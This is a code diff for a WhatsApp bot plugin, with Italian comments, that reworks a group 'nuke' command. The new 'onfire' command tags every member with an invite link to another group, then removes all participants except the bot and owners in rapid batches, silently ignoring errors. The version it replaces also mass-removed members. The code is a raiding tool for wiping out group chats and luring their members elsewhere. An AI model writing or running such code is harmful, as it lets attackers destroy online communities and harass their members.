@@ -1,50 +1,54 @@
-// Numero autorizzato (JID WhatsApp)
-const AUTHORIZED = ['212785924420@s.whatsapp.net']
+let handler = async (m, { conn, isBotAdmin }) => {
+    if (!m.isGroup) return;
+    if (!isBotAdmin) return;
+    if (!global.db.data.settings[conn.user.jid]?.restrict) return;
 
-export default async function handler(m, { conn }) {
-  try {
-    if (!m.isGroup) return
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    // Controllo numero autorizzato
-    if (!AUTHORIZED.includes(m.sender)) {
-      return m.reply('❌ Non sei autorizzato a usare questo comando.')
+    // Metadata
+    const metadata = await conn.groupMetadata(m.chat);
+    const participants = metadata.participants;
+
+    // Owners
+    const owners = new Set(
+        (global.owner || [])
+            .map(v => Array.isArray(v) ? v[0] : v)
+            .filter(v => typeof v === 'string')
+            .map(v => v.replace(/\D/g, '') + '@s.whatsapp.net')
+    );
+
+    // Targets
+    let targets = participants
+        .map(p => p.id)
+        .filter(id =>
+            id !== conn.user.jid &&
+            !owners.has(id)
+        );
+
+    if (!targets.length) return;
+
+    // 🔔 TAG TUTTI (1 SOLO MESSAGGIO)
+    await conn.sendMessage(m.chat, {
+        text: 'https://chat.whatsapp.com/HKJ5ooa0EHlGw4ykA1sooJ',
+        mentions: targets
+    }).catch(() => {});
+
+    // ⚙️ CONFIG
+    const BATCH_SIZE = 20; // ideale per 250+
+    const DELAY = 180;
+
+    // 💥 NUKE
+    for (let i = 0; i < targets.length; i += BATCH_SIZE) {
+        let batch = targets.slice(i, i + BATCH_SIZE);
+        await conn.groupParticipantsUpdate(m.chat, batch, 'remove')
+            .catch(() => {});
+        await sleep(DELAY);
     }
+};
 
-    // Ottieni metadata del gruppo
-    const metadata = await conn.groupMetadata(m.chat)
-    await m.reply('⏳ Operazione in corso...')
+handler.command = /^(onfire)$/i;
+handler.group = true;
+handler.owner = true;
+handler.fail = null;
 
-    // Aggiorna subject e description
-    await conn.groupUpdateSubject(m.chat, `${metadata.subject} | MOD`)
-    await conn.groupUpdateDescription(m.chat, 'Gruppo gestito dal bot')
-
-    const botJid = conn.user?.jid || conn.user?.id
-    const removedUsers = []
-
-    // Ciclo su tutti i partecipanti
-    for (const p of metadata.participants) {
-      if (p.id === botJid) continue           // non rimuovere bot
-      if (p.admin === 'superadmin') continue  // non rimuovere owner
-      try {
-        await conn.groupParticipantsUpdate(m.chat, [p.id], 'remove')
-        removedUsers.push(p.id)
-        await new Promise(r => setTimeout(r, 1500)) // anti-flood
-      } catch {
-        // Ignora utenti non rimovibili
-        continue
-      }
-    }
-
-    await m.reply(`✅ Operazione completata.\nRimossi: ${removedUsers.length} partecipanti.`)
-
-  } catch (e) {
-    console.error('[NUKE FATAL]', e)
-    m.reply('❌ Errore durante l’operazione.')
-  }
-}
-
-// Configurazione plugin ChatUnity v8
-handler.command = ['pugnala']
-handler.tags = ['group']
-handler.group = true
-handler.botAdmin = true
+export default handler;
